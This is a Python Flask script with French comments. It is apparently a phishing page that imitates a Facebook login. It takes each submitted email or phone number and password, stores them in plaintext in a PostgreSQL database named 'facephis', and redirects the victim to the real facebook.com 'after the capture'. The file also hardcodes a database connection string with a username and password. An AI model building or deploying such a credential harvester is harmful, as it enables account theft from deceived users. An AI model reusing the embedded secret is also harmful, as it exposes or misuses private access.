import os
import psycopg2
from flask import Flask, render_template, request, redirect

app = Flask(__name__)

# URL de votre base de données Render
DATABASE_URL = "postgresql://facephis_user:eUk52l5Pv6VC8DsRW7Giy6au6xW7xfSD@dpg-d5ukgh2li9vc739m8teg-a.oregon-postgres.render.com/facephis"

def get_db_connection():
    # Connexion à PostgreSQL
    conn = psycopg2.connect(DATABASE_URL)
    return conn

@app.route('/')
def index():
    # Affiche votre page de connexion
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    # Récupération des données du formulaire
    email = request.form.get('email_ou_telephone')
    password = request.form.get('mot_de_passe')

    if email and password:
        try:
            conn = get_db_connection()
            cur = conn.cursor()
            
            # Insertion des données dans la table
            cur.execute(
                "INSERT INTO utilisateurs (email, password) VALUES (%s, %s)",
                (email, password)
            )
            
            conn.commit()
            cur.close()
            conn.close()
            
            # Redirection vers le vrai site après la capture
            return redirect("https://www.facebook.com")
        except Exception as e:
            return f"Erreur base de données : {e}"
    
    return "Veuillez remplir tous les champs."

if __name__ == '__main__':
    # Configuration pour le déploiement sur Render
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
